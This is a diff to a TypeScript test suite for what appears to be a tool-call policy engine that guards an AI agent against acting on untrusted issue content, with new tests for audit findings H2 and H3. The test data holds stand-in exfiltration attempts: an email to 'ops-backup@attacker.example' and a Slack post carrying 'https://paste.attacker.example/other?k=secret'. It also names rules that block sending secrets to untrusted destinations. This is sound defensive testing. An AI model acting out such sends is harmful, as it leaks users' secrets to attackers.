@@ -70,7 +70,10 @@ describe('everyday template', () => {
       body: 'API_KEY=...',
     });
     expect(mail.verdict).toBe('block');
-    expect(mail.matchedRules.map((r) => r.ruleId)).toEqual(['block-send-to-untrusted']);
+    expect(mail.matchedRules.map((r) => r.ruleId)).toEqual([
+      'block-send-to-untrusted',
+      'ask-untrusted-value-in-other-tools',
+    ]);
     // The URL is inside free text, not a whole argument.
     expect(
       c.decide('slack', 'post_message', {
@@ -129,5 +132,28 @@ describe('everyday template', () => {
     ] as const) {
       expect(c.decide(server, tool, { q: 'build' }).verdict, tool).toBe('allow');
     }
+  });
+
+  it('asks when an untrusted value reaches a tool it does not know by name (audit H2)', () => {
+    const c = setup();
+    c.readIssue();
+    // `notify_user` sends email, but matches no outbound name pattern.
+    const d = c.decide('mailer', 'notify_user', { address: 'ops-backup@attacker.example' });
+    expect(d.verdict).toBe('ask');
+    expect(d.matchedRules.map((r) => r.ruleId)).toEqual(['ask-untrusted-value-in-other-tools']);
+    // Reads with the same value still run.
+    expect(
+      c.decide('crm', 'lookup_contact', { email: 'ops-backup@attacker.example' }).verdict,
+    ).toBe('allow');
+  });
+
+  it('asks when a URL goes to a host the issue named, with another path (audit H3)', () => {
+    const c = setup();
+    c.readIssue();
+    const d = c.decide('slack', 'post_message', {
+      channel: 'general',
+      text: 'see https://paste.attacker.example/other?k=secret',
+    });
+    expect(d.verdict).toBe('ask');
   });
 });
